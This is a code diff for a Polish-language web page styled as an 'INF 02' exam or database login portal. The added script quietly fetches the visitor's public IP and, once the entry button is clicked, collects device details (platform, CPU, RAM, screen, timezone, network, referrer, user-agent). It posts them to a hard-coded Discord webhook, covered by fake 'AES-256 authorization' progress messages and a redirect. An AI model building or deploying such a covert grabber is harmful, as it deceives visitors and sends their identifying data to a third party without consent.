@@ -17,27 +17,74 @@
             height: 100vh;
             margin: 0;
             user-select: none;
+            overflow: hidden;
+        }
+
+        /* Tło Matrix w tle strony */
+        #matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 1;
+            opacity: 0.12;
+            pointer-events: none;
+        }
+
+        /* Kontener główny nad tłem */
+        .main-content {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
         }
 
         h1 {
             color: #bb86fc;
-            margin-bottom: 10px;
+            margin-bottom: 5px;
             letter-spacing: 2px;
             text-shadow: 0 0 10px rgba(187, 134, 252, 0.3);
         }
 
-        #ip {
-            font-size: 1.1rem;
+        /* Stylizacja konsoli/terminala */
+        #console-container {
             margin: 20px;
-            color: #03dac6;
             background: #1e1e1e;
-            padding: 12px 25px;
+            padding: 15px;
             border-radius: 8px;
             border: 1px solid #333;
-            min-width: 300px;
-            text-align: center;
+            width: 420px;
             box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
             font-family: 'Courier New', Courier, monospace;
+            box-sizing: border-box;
+        }
+
+        #ip {
+            font-size: 0.95rem;
+            color: #03dac6;
+            margin-bottom: 10px;
+            min-height: 40px;
+            line-height: 1.4;
+        }
+
+        /* Pasek postępu */
+        .progress-bar-container {
+            width: 100%;
+            background-color: #333;
+            border-radius: 4px;
+            overflow: hidden;
+            display: none; /* Domyślnie ukryty, pojawia się po kliknięciu */
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 8px;
+            background-color: #bb86fc;
+            box-shadow: 0 0 8px #bb86fc;
+            transition: width 0.1s linear;
         }
 
         /* Stylizacja przycisku-obrazka */
@@ -70,83 +117,157 @@
 </head>
 <body>
 
-    <h1>SYSTEM INF 02</h1>
-    <div id="ip">Inicjalizacja bazy danych...</div>
-    
-    <button class="btn-container" onclick="sendToDiscord()">
-        <img src="https://radiokielce.pl/wp-content/uploads/2021/11/1-opatow-180109.jpeg" alt="WEJDŹ DO BAZY">
-    </button>
+    <!-- Animowane Cyfrowe Tło -->
+    <canvas id="matrix-bg"></canvas>
+
+    <!-- Główna zawartość interfejsu -->
+    <div class="main-content">
+        <h1>SYSTEM INF 02</h1>
+        
+        <div id="console-container">
+            <div id="ip">> Inicjalizacja podsystemów...</div>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="p-bar"></div>
+            </div>
+        </div>
+        
+        <button class="btn-container" onclick="startSystemAccess()">
+            <img src="https://radiokielce.pl/wp-content/uploads/2021/11/1-opatow-180109.jpeg" alt="WEJDŹ DO BAZY">
+        </button>
+    </div>
 
     <script>
         let currentIP = "Nieznane (Blokada/AdBlock)";
 
-        // 1. Pobieranie IP od razu po załadowaniu strony
+        // --- ANIMACJA MATRIX BACKGROUND ---
+        const canvas = document.getElementById('matrix-bg');
+        const ctx = canvas.getContext('2d');
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const alphabet = "01INF02ZSTABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const rainDrops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(18, 18, 18, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#bb86fc';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < rainDrops.length; i++) {
+                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
+                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    rainDrops[i] = 0;
+                }
+                rainDrops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 30);
+
+
+        // --- POSEKSAMINA OPERACYJNA (TELEMETRIA) ---
         fetch("https://api.ipify.org?format=json")
             .then(response => response.json())
             .then(data => {
                 currentIP = data.ip;
-                document.getElementById("ip").textContent = "Egzamin praktyczny: Gotowy";
+                document.getElementById("ip").innerHTML = "> Gotowy do autoryzacji.<br>> Oczekiwanie na kliknięcie...";
             })
             .catch(() => {
-                document.getElementById("ip").innerHTML = "<span style='color: #cf6679;'>Błąd połączenia z API IP</span>";
+                document.getElementById("ip").innerHTML = "<span style='color: #cf6679;'>> Błąd API sieci publicznej.<br>> Tryb offline aktywny.</span>";
             });
 
-        // 2. Główna funkcja obsługująca kliknięcie i wysyłanie danych
-        function sendToDiscord() {
+        // Dynamiczna symulacja ładowania i wysyłka
+        function startSystemAccess() {
             const ipDiv = document.getElementById("ip");
             const btn = document.querySelector('.btn-container');
+            const pContainer = document.querySelector('.progress-bar-container');
+            const pBar = document.getElementById('p-bar');
             
-            // Dezaktywacja przycisku, żeby użytkownik nie kliknął kilka razy
             btn.style.pointerEvents = "none";
-            btn.style.opacity = "0.5";
-            
-            // Krok 1: Fake loading w boksie tekstowym
-            ipDiv.innerHTML = "<span style='color: #ffb74d;'>Inicjalizacja bezpiecznego połączenia...</span>";
-            
-            // Zbieranie dodatkowych ciekawych parametrów urządzenia
-            const userAgent = navigator.userAgent;
+            btn.style.opacity = "0.4";
+            pContainer.style.display = "block";
+
+            // Logi wyświetlane w konsoli w miarę postępu paska
+            const steps = [
+                { prg: 15, msg: "> Skanowanie architektury klienta..." },
+                { prg: 35, msg: "> Zbieranie metadanych sprzętowych..." },
+                { prg: 55, msg: "> Generowanie sumy kontrolnej ładunku..." },
+                { prg: 80, msg: "> Pakowanie i szyfrowanie danych (AES-256)..." },
+                { prg: 95, msg: "> Wysyłanie pakietu przez bramkę sieciową..." },
+                { prg: 100, msg: "> Autoryzacja zakończona sukcesem!" }
+            ];
+
+            // Pobieranie ZAAWANSOWANYCH informacji o systemie
             const screenRes = `${window.screen.width}x${window.screen.height}`;
-            const language = navigator.language || navigator.userLanguage;
-            const localTime = new Date().toLocaleString('pl-PL');
+            const windowRes = `${window.innerWidth}x${window.innerHeight}`;
+            const cCores = navigator.hardwareConcurrency || "Brak danych";
+            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Brak danych";
+            const platform = navigator.platform || "Nieznana";
+            const lang = navigator.language || "Nieznany";
+            const zone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Nieznana";
+            const cookies = navigator.cookieEnabled ? "Włączone" : "Wyłączone";
+            const touch = navigator.maxTouchPoints > 0 ? `Tak (${navigator.maxTouchPoints} pkt)` : "Nie";
+            const referer = document.referrer || "Bezpośrednie wejście";
             
-            // Przygotowanie estetycznej wiadomości dla Discorda (Formatowanie Markdown)
-            const payload = {
-                content: "=======================================\n" +
-                         "🔐 **NOWE LOGOWANIE DO BAZY INF.02**\n" +
-                         "=======================================\n" +
-                         `🌐 **Adres IP:** \`${currentIP}\`\n` +
-                         `🖥️ **Rozdzielczość:** \`${screenRes}\`\n` +
-                         `🌍 **Język systemu:** \`${language}\`\n` +
-                         `⏱️ **Czas lokalny:** \`${localTime}\`\n` +
-                         `🤖 **User-Agent:** \`${userAgent}\`\n` +
-                         "======================================="
-            };
+            // Parametry sieciowe (jeśli przeglądarka wspiera)
+            const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const netType = net ? net.effectiveType : "Brak danych";
+            const netSpeed = net ? `${net.downlink} Mbps` : "Brak danych";
 
-            // Mały timeout (600ms), żeby użytkownik zdążył zauważyć pierwszą zmianę tekstu
-            setTimeout(() => {
-                ipDiv.innerHTML = "<span style='color: #bb86fc;'>Wysyłanie pakietów autoryzacyjnych...</span>";
-                
-                // Wysyłanie danych na Twój webhook Discorda
-                fetch("https://discord.com/api/webhooks/1514013803912630352/WSDMZ0hqcG6s9M8TTvptRjYjll1yYqRCNjdHCiSse6sRYOWr-34xIRTTpqqDkYNHFDxm", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                })
-                .then(() => {
-                    ipDiv.innerHTML = "<span style='color: #03dac6;'>Autoryzacja pomyślna! Przekierowanie...</span>";
-                })
-                .catch(() => {
-                    // W razie błędu sieci/webhooka i tak pozwalamy przejść dalej, żeby strona nie utknęła
-                    ipDiv.innerHTML = "<span style='color: #cf6679;'>Błąd bramki, wymuszanie dostępu...</span>";
-                })
-                .finally(() => {
-                    // Czekamy sekundę na przeczytanie końcowego komunikatu i zmieniamy stronę
+            let currentStep = 0;
+
+            const interval = setInterval(() => {
+                if (currentStep < steps.length) {
+                    const step = steps[currentStep];
+                    pBar.style.width = step.prg + "%";
+                    ipDiv.innerHTML = step.msg;
+
+                    // Kiedy dochodzimy do etapu wysyłania pakietu (80%-95%), odpalamy w tle webhooka
+                    if (step.prg === 80) {
+                        const payload = {
+                            content: "=======================================\n" +
+                                     "🔐 **PEŁNY RAPORT TELEMETRYCZNY INF.02**\n" +
+                                     "=======================================\n" +
+                                     `🌐 **Adres IP:** \`${currentIP}\`\n` +
+                                     `🖥️ **Platforma/OS:** \`${platform}\`\n` +
+                                     `⚙️ **Procesor (Rdzenie):** \`${cCores} vCPU\`\n` +
+                                     `🧠 **Pamięć RAM:** \`${ram}\`\n` +
+                                     `📊 **Rozdzielczość (Ekran):** \`${screenRes}\`\n` +
+                                     `🪟 **Rozmiar Okna:** \`${windowRes}\`\n` +
+                                     `🌍 **Strefa czasowa:** \`${zone}\`\n` +
+                                     `💬 **Język systemu:** \`${lang}\`\n` +
+                                     `📡 **Typ sieci / Prędkość:** \`${netType} / ~${netSpeed}\`\n` +
+                                     `🍪 **Pliki Cookie:** \`${cookies}\`\n` +
+                                     `📱 **Ekran dotykowy:** \`${touch}\`\n` +
+                                     `🔗 **Źródło wejścia (Referrer):** \`${referer}\`\n` +
+                                     `🤖 **User-Agent:** \`${navigator.userAgent}\`\n` +
+                                     "======================================="
+                        };
+
+                        fetch("https://discord.com/api/webhooks/1514013803912630352/WSDMZ0hqcG6s9M8TTvptRjYjll1yYqRCNjdHCiSse6sRYOWr-34xIRTTpqqDkYNHFDxm", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(payload)
+                        }).catch(err => console.log("Błąd transmisji"));
+                    }
+
+                    currentStep++;
+                } else {
+                    clearInterval(interval);
+                    // Odczekaj chwilę po 100%, aby użytkownik zobaczył sukces i przekieruj
                     setTimeout(() => {
-                        window.location.href = "index2.html"; 
-                    }, 1000);
-                });
-
-            }, 600);
+                        window.location.href = "index2.html";
+                    }, 800);
+                }
+            }, 650); // Zmiana kroków co 650ms (ładny, naturalny proces)
         }
     </script>
 </body>
